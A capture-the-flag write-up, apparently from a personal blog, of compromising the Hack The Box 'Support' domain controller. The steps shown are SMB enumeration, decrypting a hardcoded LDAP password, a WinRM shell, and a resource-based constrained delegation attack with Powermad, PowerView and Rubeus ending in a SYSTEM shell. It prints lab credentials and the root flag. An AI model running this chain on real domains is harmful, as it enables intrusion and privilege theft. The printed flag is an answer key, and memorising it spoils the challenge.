---
title: Support
summary: "workflow of HTB machine Support"
date: 2025-11-15
tag: htb-machines
---

![](/images/posts/Support.png)
[https://app.hackthebox.com/machines/484](https://app.hackthebox.com/machines/484)

---
# Enumeration 

## `nmap` scan 

```bash
$nmap -sC -sV 10.10.11.174 -Pn

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-07 23:12:51Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
| smb2-time: 
|   date: 2025-10-07T23:13:32
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

- there is SMB, LDAP, DNS ... that mean this machine use AD
- the domain is `support.htb`
- the domain controller is `DC.support.htb`

## shares 

- The machine does not provide creds . so i use `anonymous` session to enumerate SMB shares

```bash
$nxc smb 10.10.11.174 -u 'anonymous' -p '' --shares

SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.174    445    DC               [+] support.htb\anonymous: (Guest)
SMB         10.10.11.174    445    DC               [*] Enumerated shares
SMB         10.10.11.174    445    DC               Share           Permissions     Remark
SMB         10.10.11.174    445    DC               -----           -----------     ------
SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.174    445    DC               C$                              Default share
SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share 
```

> There is an uncommon share in AD called `support-tools`. The output also shows that we have read permission

- I use `smblcient` to access to this share

```bash
$smbclient -N //10.10.11.174/support-tools
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 18:01:06 2022
  ..                                  D        0  Sat May 28 12:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 12:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 12:19:55 2022
  putty.exe                           A  1273576  Sat May 28 12:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 12:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 18:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 12:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 12:19:43 2022

                4026367 blocks of size 4096. 959326 blocks available

```

> there is several files . i will upload them to my machine using `get <file_name>` 

- all these files are public tools but `UserInfo.exe.zip` not . after i upload it I unzip it using `unzip UserInfo.exe.zip -d UserInfo.exe` 
- from this dir , there is `UserInfo.exe` file . I use `ilspycmd` to decompile it 

```bash
$ ls
CommandLineParser.dll
Microsoft.Bcl.AsyncInterfaces.dll
Microsoft.Extensions.DependencyInjection.Abstractions.dll
Microsoft.Extensions.DependencyInjection.dll
Microsoft.Extensions.Logging.Abstractions.dl
System.Buffers.dll
System.Memory.dll
System.Numerics.Vectors.dll
System.Runtime.CompilerServices.Unsafe.dll
System.Threading.Tasks.Extensions.dll
UserInfo.exe
UserInfo.exe.config

$ ilspycmd -o ./decompiled UserInfo.exe

$ cat decompiled/UserInfo.decompiled.cs

....SNIP

namespace UserInfo.Services
{
	internal class Protected
	{
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		private static byte[] key = Encoding.ASCII.GetBytes("armando");

		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (byte)(array[i] ^ key[i % key.Length] ^ 0xDF);
			}
			return Encoding.Default.GetString(array2);
		}
	}

...SNIP

public LdapQuery()                                                                                                                                                            
                {                                                                                                                                                                             
                        //IL_0018: Unknown result type (might be due to invalid IL or missing references)                                                                                     
                        //IL_0022: Expected O, but got Unknown                                                                                                                                
                        //IL_0035: Unknown result type (might be due to invalid IL or missing references)                                                                                     
                        //IL_003f: Expected O, but got Unknown                                                                                                                                
                        string password = Protected.getPassword();                                                                                                                            
                        entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);                                                                                          
                        entry.AuthenticationType = (AuthenticationTypes)1;                                                                                                                    
                        ds = new DirectorySearcher(entry);

...SNIP

```

> from the output, we see a encrypted **password** and function that decrypt it also the username `ldap` . I use same process to function in python to decrypt it 

```python
#!/usr/bin/env python3
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

data = base64.b64decode(enc_password)
decoded_bytes = bytes((b ^ key[i % len(key)] ^ 0xDF) for i, b in enumerate(data))

# Try UTF-8 first, fall back to latin-1 if needed
try:
    decoded_str = decoded_bytes.decode("utf-8")
except UnicodeDecodeError:
    decoded_str = decoded_bytes.decode("latin-1")

print(decoded_str)

```

![](/images/posts/Support_000248.png)

>[!success] new creds
>`ldap` : `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

## foothold 

- i run `ldapsearch` tool to connect with LDAP to see if I can retrieve some information 

```bash
ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*"
```

- it give several information , to read this data we can use  Apache Directory studio which can be used to more efficiently view LDAP data . It provides a graphical interface, which can be used to more efficiently view LDAP data.
- after I connect with LDAP . I can see the LDAP objects 

![](/images/posts/Support_000249.png)

- under `DC=support,DC=htb` we notice there is a object with CN `Users` that is contains all info users in remote machine. 
- there is an user `support` has a `info` attribute with value `Ironside47pleasure40Watchful` . it seems like a password . also this user is a member of `Remote Management Users`.

![](/images/posts/Support_000250.png)

- I use `nxc` tool to test this creds 
![](/images/posts/Support_000251.png)

> the creds are valid 


- now we can use `evil-winrm` to connect support user remotely 

```bash
$evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
*Evil-WinRM* PS C:\Users\support\Documents>
```

>[!success] WinRM creds
>`support` : `Ironside47pleasure40Watchful`

# Privileges escalation 

- I run `bloodhound-python` tool using support user creds to collocate data within domain 

```bash
$bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -ns $IP -d support.htb -c all 
```

- i found that the user support is a member of `SHARED SUPPORT ACCOUNTS` 
- this group has `GenericAll` privileges on DC since the support user is a member of this group , they also have all its privileges 

![](/images/posts/Support_000254.png)

- Bloodhound mentioned that due to the `GenericAll` privileges we can perform **resource based constrained delegation attack** to escalate privileges.  

![](/images/posts/Support_000255.png)

## Exploit
- I upload `PowerView.ps1`

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> upload PowerView.ps1
                                        
Info: Upload successful!

*Evil-WinRM* PS C:\Users\support\Documents> import-module ./PowerView.ps1

```

- we can create a computer object 
```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainObject -Identity "dc=support,dc=htb" -Domain support.htb | select ms-ds-machineaccountquota

ms-ds-machineaccountquota
-------------------------
                       10

```

- I use `Powermad.ps1` to create `FAKE01` a new computer object 

```powershell
Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = FAKE01$
Verbose: [+] Distinguished Name = CN=FAKE01,CN=Computers,DC=support,DC=htb
[+] Machine account FAKE01 added

*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer fake01                                                                                                         21:03:05 [9/267]
                                                                                                                                                                                              
                                                                                                                                                                                              
pwdlastset             : 10/10/2025 1:01:35 PM                                                                                                                                                
logoncount             : 0                                                                                                                                                                    
badpasswordtime        : 12/31/1600 4:00:00 PM                                                                                                                                                
distinguishedname      : CN=FAKE01,CN=Computers,DC=support,DC=htb                                                                                                                             
objectclass            : {top, person, organizationalPerson, user...}                                                                                                                         
name                   : FAKE01                                                                                                                                                               
objectsid              : S-1-5-21-1677581083-3380853377-188903654-5601                                                                                                                        
samaccountname         : FAKE01$               
localpolicyflags       : 0                     
codepage               : 0                     
samaccounttype         : MACHINE_ACCOUNT                                                       
accountexpires         : NEVER                 
countrycode            : 0                     
whenchanged            : 10/10/2025 8:01:35 PM                                                 
instancetype           : 4                     
usncreated             : 86207                 
objectguid             : 2d11899c-822b-4f89-a63a-6afc5f5dc878                                  
lastlogon              : 12/31/1600 4:00:00 PM                                                 
lastlogoff             : 12/31/1600 4:00:00 PM                                                 
objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=support,DC=htb
dscorepropagationdata  : 1/1/1601 12:00:00 AM                                                  
serviceprincipalname   : {RestrictedKrbHost/FAKE01, HOST/FAKE01, RestrictedKrbHost/FAKE01.support.htb, HOST/FAKE01.support.htb}
ms-ds-creatorsid       : {1, 5, 0, 0...}                                                       
badpwdcount            : 0                     
cn                     : FAKE01                
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT  
whencreated            : 10/10/2025 8:01:35 PM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 86209
dnshostname            : FAKE01.support.htb
```

- Create a new raw security descriptor for the `FAKE01` computer principal  and add it to the `msds-allowedtoactonbehalfofotheridentity` attribute value of the **DC** computer object.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5602)"

*Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)

*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
Verbose: [Get-DomainObject] Extracted domain 'support.htb' from 'CN=DC,OU=Domain Controllers,DC=support,DC=htb'
Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC,OU=Domain Controllers,DC=support,DC=htb)))
Verbose: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 163 162 39 152 200 155 131 48 247 68 160 62 130 4 0 0' for object 'DC$'

Evil-WinRM* PS C:\Users\support\Documents> Get-NetComputer dc | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

name msds-allowedtoactonbehalfofotheridentity
---- ----------------------------------------
DC   {1, 0, 4, 128...}

```

- Generating RC4 Hash to request a service ticket using the S4U Kerberos extension.
```powershell
*Evil-WinRM* PS C:\Users\support\Documents\Rubeus.exe> .\Rubeus.exe hash /password:123456 /user:fake01 /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : 123456
[*] Input username             : fake01
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBfake01
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : 3E1A2E5F7675F6BA5C21FDEABFD92B93
[*]       aes256_cts_hmac_sha1 : 37CD1332C1F8DC0C4AA0B738CC971DEBD8D66AED50AF2AF2EC63B7459344B834
[*]       des_cbc_md5          : E0795B98AEA1A16B

```

- requesting an S4U ticket with Rubeus

```powershell
*Evil-WinRM* PS C:\Users\support\Documents\Rubeus.exe> .\Rubeus.exe s4u /user:FAKE01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt   
                                                                                                                                                                                                                   
   ______        _                                                                                                                                                                                                 
  (_____ \      | |                                                                                                                                                                                                
   _____) )_   _| |__  _____ _   _  ___                                                                                                                                                                            
  |  __  /| | | |  _ \| ___ | | | |/___)                                                                                                                                                                           
  | |  \ \| |_| | |_) ) ____| |_| |___ |                                                                                                                                                                           
  |_|   |_|____/|____/|_____)____/(___/                                                                                                                                                                            
                                                                                                                                                                                                                   
  v2.2.0                                                                                                                                                                                                           
                                                                                                                                                                                                                   
[*] Action: S4U                                                                                                                                                                                                    
                                                                                                                                                                                                                   
[*] Using rc4_hmac hash: 32ED87BDB5FDC5E9CBA88547376818D4                                                                                                                                                          
[*] Building AS-REQ (w/ preauth) for: 'support.htb\FAKE01$'                                                                                                                                                        
[*] Using domain controller: ::1:88                                                                                                                                                                                
[+] TGT request successful!                                                                                                                                                                                        
[*] base64(ticket.kirbi):                                                                                                                                                                                          
                                                                                                                                                                                                                   
      doIFUjCCBU6gAwIBBaEDAgEWooIEazCCBGdhggRjMIIEX6ADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD                                                                                                                             
      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBCUwggQhoAMCARKhAwIBAqKCBBMEggQPVIwMz+vA                                                                                                                             
      vdK4Fd1dnn1Dt1xzyMdgYmdKwCGmQc47HcnZZKg8ndR/Tg1ad25Ut0kfRK8/C/nqLCc9TADNjdVbRO4k                                                                                                                             
      xgV2X5RuhHWT8O+yrPAoHsa6VG4uHSI6E8JhXkB6eh3/lODGXeqCAhuZbfWcHUlKOF9G1An4zPuujkqs                                                                                                                             
      dnioK8udsUKZJZ+1QA9TZd7Y9/YTN4o0ZNzOfT2OOiRIJtiOPo2LxbJKctXTlYu/4j0Gpo3mfYnuoC5/                                                                                                                             
      jIXDV24D1NmjTCgt/41b2Cv9IYikiNbeoOdCaoX6I9p7iKSXGjtSgHhNdByTj3y7q4hdh2bPKpTDWami                                                                                                                             
      qPNHb0i099EPtp2V5BfSBjKHzdGXwq65KHi4rD7AN+8QTNjif9S+YlqLn00UjvsAmJpsMnJUoi5/7RUj                                                                                                                             
      w6cibuDqS/3W6MZsH/K/elFlLEDYaiwXdKeSek/sBRVrGhakSJiN3RDpJVgA9viVgiOl+EPXW6O634ms                                                                                                                             
      GNuiDWLa3ytEk4K9AEMQJXr413U0Tm2IW7xLLmCYSVqZkufL6jrBGs9DkhcleAnvM6GARIV4Zs4npJ6I                                                                                                                             
      TCEV2DVIUnmd8AcxtiqJDYF9936GTtbPsid41TTAyMyDio20nEQs9/HGcrGG9korcQzcrQHC/fSiXsjK                                                                                                                             
      XPI+HMhlE3NEtivRquHFhQPogWO+nHjluPjx9sLJpMocm1Ok2JI3yRtAODY1tbfSLpw88Y1aV09dKXs8   
      
...SNIP...
```

- we should be able to view ticket by running `klist` command 

```powershell
*Evil-WinRM* PS C:\Users\support\Documents\Rubeus.exe> klist

Current LogonId is 0:0x13f2671

Cached Tickets: (1)

#0>     Client: administrator @ SUPPORT.HTB
        Server: cifs/dc.support.htb @ SUPPORT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 10/10/2025 15:50:19 (local)
        End Time:   10/11/2025 1:50:19 (local)
        Renew Time: 10/17/2025 15:50:19 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

```

- I re-run the `rebeus.exe` command with `/nowrap` to get ticket without whitespace

```powershell
*Evil-WinRM* PS C:\Users\support\Documents\Rubeus.exe> .\Rubeus.exe s4u /user:FAKE01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt /n
owrap
```

![](/images/posts/Support_000257.png)

- I decode this ticket and use `impacket-ticketConverter` script to covert ticket to `ccache` file 

```bash
$impacket-ticketConverter ticket.kirbi ticket.ccache                                                
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done

```

- then i run `psexec.py` to access to DC

```bash
$KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file QAfVqOKm.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service RkIn on dc.support.htb.....
[*] Starting service RkIn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
64e812da9598957e215a8bf174930fe7
```

![](/images/posts/Support_Pwned.png)
